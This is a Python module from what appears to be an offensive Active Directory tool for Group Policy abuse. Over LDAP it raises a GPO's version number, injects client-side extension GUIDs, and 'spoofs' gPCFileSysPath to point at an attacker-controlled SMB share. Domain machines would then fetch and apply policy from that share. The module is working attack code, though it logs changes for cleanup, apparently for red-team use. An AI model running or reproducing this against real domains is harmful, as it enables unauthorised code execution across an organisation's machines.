import re

from helpers.ldap       import set_attribute, modify_attribute, get_entry_attribute
from helpers.clean      import clean_save_action
from helpers.utils      import bcolors, logger

from helpers.utils import bcolors, logger
from gpblib.modules_configs import MODULES_CONFIG


def update_gpc_version(cfg):
    modify_attribute(cfg.ldap_session, cfg.gpo_dn, "versionNumber", cfg.updated_gpo_version)
    # We are not saving this to be restored. We are keeping the updated version number for subsequent legitimate GPO modifications
    # clean_save_action(cfg.clean_folder, "versionNumber", cfg.gpo_dn, "versionNumber", old_value=cfg.current_gpo_version, new_value=cfg.updated_gpo_version, added=False)


def get_current_extension_names(cfg, setting_type: str):
    if setting_type == "computer":
        extensions_attribute = "gPCMachineExtensionNames"
    else:
        extensions_attribute = "gPCUserExtensionNames"
    current_extensionames = get_entry_attribute(cfg.ldap_session, cfg.gpo_dn, extensions_attribute)
    return current_extensionames

def generate_extension_names(module_name, extension_names):
    module = MODULES_CONFIG[module_name]

    if module["setting_type"] == "Preferences":
        if "00000000-0000-0000-0000-000000000000" not in [guid_pair[0] for guid_pair in extension_names]:
            extension_names.insert(0, ["00000000-0000-0000-0000-000000000000", module["admin_guid"]])
        else:
            for item in extension_names:
                if item[0] == "00000000-0000-0000-0000-000000000000":
                    if module["admin_guid"] not in item:
                        item.append(module["admin_guid"])
                    break

    if [module["cse_guid"], module["admin_guid"]] not in extension_names:
        extension_names.append([module["cse_guid"], module["admin_guid"]])
    
    # For whatever reason, extension names actually need to be sorted to be processed correctly (not the case for the GPO core Preferences guids)
    extension_names.sort(key=lambda guid_pair: guid_pair[0])
    return extension_names


def update_extensionNames(cfg, setting_type):
    if setting_type == "computer":
        extensions_attribute = "gPCMachineExtensionNames"
    else:
        extensions_attribute = "gPCUserExtensionNames"

    logger.info(f"[INFO] Starting the update of the '{extensions_attribute}' attribute")
    current_extension_names = str(get_current_extension_names(cfg, setting_type))
    logger.info(f"[INFO] Current extension names: {current_extension_names}")
    extension_names = [] # We are remplacing the original GPO with an empty one, so we only need the extension names of the configurations that we inject
    for module_name in cfg.modules[setting_type].keys():
        extension_names = generate_extension_names(module_name, extension_names)
    if extension_names is not None:
        extension_names = [''.join(f"{{{guid}}}" for guid in guid_pair) for guid_pair in extension_names]
        extension_names = ''.join(f"[{item}]" for item in extension_names)
        logger.info(f"[INFO] Updated extension names: {extension_names}")
        if current_extension_names == "[]":
            set_attribute(cfg.ldap_session, cfg.gpo_dn, extensions_attribute, extension_names)
            clean_save_action(cfg.clean_folder, "ldap_set_attribute", cfg.gpo_dn, attribute=extensions_attribute, old_value=None, new_value=extension_names)
            logger.warning(f"{bcolors.OKGREEN}[+] '{extensions_attribute}' successfully set{bcolors.ENDC}")
            return
        if extension_names != current_extension_names:
            modify_attribute(cfg.ldap_session, cfg.gpo_dn, extensions_attribute, extension_names)
            clean_save_action(cfg.clean_folder, "ldap_modify_attribute", cfg.gpo_dn, attribute=extensions_attribute, old_value=current_extension_names, new_value=extension_names)
            logger.warning(f"{bcolors.OKGREEN}[+] '{extensions_attribute}' successfully updated{bcolors.ENDC}")
        else:
            logger.warning(f"{bcolors.OKGREEN}[+] Necessary extension names for '{extensions_attribute}' are already present, no need to update{bcolors.ENDC}")


def spoof_gPCFileSysPath(cfg):
    current_gPCFileSysPath = get_entry_attribute(cfg.ldap_session, cfg.gpo_dn, "gPCFileSysPath")
    logger.info(f"[INFO] Current gPCFileSysPath: {current_gPCFileSysPath}")
    updated_gPCFileSysPath = f'\\\\{cfg.smb_ip}\\{cfg.smb_share}'
    logger.info(f"[INFO] Updated gPCFileSysPath should be: {updated_gPCFileSysPath}")
    if updated_gPCFileSysPath != current_gPCFileSysPath:
        modify_attribute(cfg.ldap_session, cfg.gpo_dn, "gPCFileSysPath", updated_gPCFileSysPath)
        clean_save_action(cfg.clean_folder, "ldap_modify_attribute", cfg.gpo_dn, attribute="gPCFileSysPath", old_value=current_gPCFileSysPath, new_value=updated_gPCFileSysPath)
        logger.warning(f"{bcolors.OKGREEN}[+] 'gPCFileSysPath' successfully updated{bcolors.ENDC}")
    else:
        logger.warning(f"{bcolors.OKGREEN}[+] 'gPCFileSysPath' is already set to the desired value, no need to update{bcolors.ENDC}")


def setup_gpc(cfg):
    update_gpc_version(cfg)

    if len(cfg.modules["computer"].keys()) > 0:
        update_extensionNames(cfg, "computer")
    if len(cfg.modules["user"].keys()) > 0:
        update_extensionNames(cfg, "user")

    spoof_gPCFileSysPath(cfg)
